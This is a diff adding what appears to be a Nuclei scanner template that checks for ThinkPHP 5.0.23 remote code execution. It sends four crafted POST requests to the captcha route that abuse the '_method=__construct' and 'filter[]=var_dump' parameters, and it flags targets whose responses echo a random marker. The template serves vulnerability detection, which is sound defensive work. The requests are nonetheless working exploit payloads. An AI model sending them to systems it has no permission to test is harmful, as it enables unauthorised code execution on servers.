@@ -1,0 +1,46 @@
+id: poc-local-thinkphp-v5_0_23-rce-captcha
+
+info:
+  name: ThinkPHP 5.0.23 RCE
+  author: capiton
+  severity: critical
+  description: Thinkphp5 5.0(<5.0.24) Remote Code Execution.
+  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce
+  tags: thinkphp,rce
+requests:
+  - raw:
+      - |-
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _method=__construct&filter[]=var_dump&method=get&server[REQUEST_METHOD]={{randstr}}
+
+      - |-
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _method=__construct&method=GET&filter[]=var_dump&get[]={{randstr}}
+
+      - |-
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        s={{randstr}}&_method=__construct&method=POST&filter[]=var_dump
+
+      - |-
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        aaaa={{randstr}}&_method=__construct&method=GET&filter[]=var_dump
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{randstr}}"
+          - "string("
+        condition: and
